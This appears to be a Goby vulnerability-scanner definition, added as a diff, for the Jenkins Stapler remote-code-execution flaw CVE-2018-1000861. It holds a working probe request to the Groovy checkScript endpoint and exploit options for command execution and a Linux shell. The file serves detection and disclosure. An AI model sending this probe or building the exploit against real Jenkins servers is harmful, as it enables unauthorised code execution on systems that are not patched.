@@ -1,0 +1,85 @@
+{
+  "Name": "Jenkins Multiple Security Vulnerabilities",
+  "Description": "A code execution vulnerability exists in the Stapler web framework used by Jenkins 2.153 and earlier, LTS 2.138.3 and earlier in stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java that allows attackers to invoke some methods on Java objects by accessing crafted URLs that were not intended to be invoked this way.",
+  "Product": "Jenkins",
+  "Homepage": "https://jenkins.io/",
+  "DisclosureDate": "2018-12-10",
+  "Author": "gobysec@gmail.com",
+  "FofaQuery": "app=\"Jenkins\"",
+  "GobyQuery": "app=\"Jenkins\"",
+  "Level": "3",
+  "Impact": "This allowed users to execute arbitrary code on the Jenkins master.",
+  "GifAddress": " https://raw.githubusercontent.com/gobysec/GobyVuls/master/Jenkins/CVE-2018-1000861/jenkins_CVE-2018-1000861.gif",
+  "Recommendation": "Upgrade Jenkins to version 2.154 or later, Jenkins LTS to version 2.138.4, 2.150.1 or later.",
+  "References": [
+    "http://www.securityfocus.com/bid/106176",
+    "https://access.redhat.com/errata/RHBA-2019:0024",
+    "https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595",
+    "https://nvd.nist.gov/vuln/detail/CVE-2018-1000861",
+    "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000861"
+  ],
+  "HasExp": true,
+  "ExpParams": [{
+                  "name": "AttackType",
+                  "type": "select",
+                  "value": "cmd,goby_shell_linux"
+            },{
+                  "name": "cmd",
+                  "type": "input",
+                  "value": "whoami"
+            },
+			{
+                  "name": "CMDEncode",
+                  "type": "select",
+                  "value": "echo,none,bashBase64"
+            }],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "uri": "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20goby"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+		  {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "Script1.groovy",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["rce"],
+  "CVEIDs": [
+    "CVE-2018-1000861"
+  ],
+  "CVSSScore": "9.8",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
